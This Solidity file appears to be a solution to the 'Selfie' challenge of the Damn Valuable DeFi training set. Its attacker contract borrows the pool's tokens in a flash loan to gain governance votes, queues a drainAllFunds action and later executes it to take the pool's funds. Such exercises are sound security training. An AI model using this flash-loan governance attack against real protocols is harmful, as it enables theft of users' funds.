// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract SelfieAttacker {

    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    uint256 actionId;

    function AddToQueue(
        address _pool,
        address _token,
        address _governance
    ) 
        external
        {
            token = DamnValuableTokenSnapshot(_token);
            pool = SelfiePool(_pool);
            governance = SimpleGovernance(_governance);

            pool.flashLoan(token.balanceOf(_pool));
           
    }

    function receiveTokens(
        address _token,
        uint256 amount
    ) external {

        token.snapshot();
        actionId = governance.queueAction(
                address(pool), 
                abi.encodeWithSignature(
                    "drainAllFunds(address)",
                    address(this)
                    ),
                0
            );

            token.transfer(address(pool), amount);
    }

    function executeAction()
        external
        {
            // token = DamnValuableTokenSnapshot(_token);
            // governance = SimpleGovernance(_governance);

            governance.executeAction{value: 0}(actionId);
            require(token.balanceOf(address(this)) >= 0);

            token.transfer(msg.sender, token.balanceOf(address(this))); 
        } 

}